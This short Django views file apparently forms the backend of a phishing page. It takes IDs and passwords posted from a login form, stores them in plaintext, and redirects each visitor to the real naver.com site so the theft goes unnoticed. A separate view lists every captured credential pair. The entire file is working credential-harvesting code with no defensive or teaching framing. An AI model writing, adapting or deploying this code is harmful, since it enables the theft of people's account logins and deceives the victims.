from django.shortcuts import render, redirect
from django.http import HttpResponse
from .models import User

# Create your views here.

def index(request):
    if request.method == 'GET':
        return render(request, 'index.html')
    elif request.method == 'POST':
        id = request.POST.get('id')
        pw = request.POST.get('pw')
        if not User.objects.filter(id=id, pw=pw).exists():
            User.objects.create(id=id, pw=pw)
        return redirect('https://www.naver.com/')

def manage(request):
    return render(request, 'manage.html', {'users': User.objects.all()})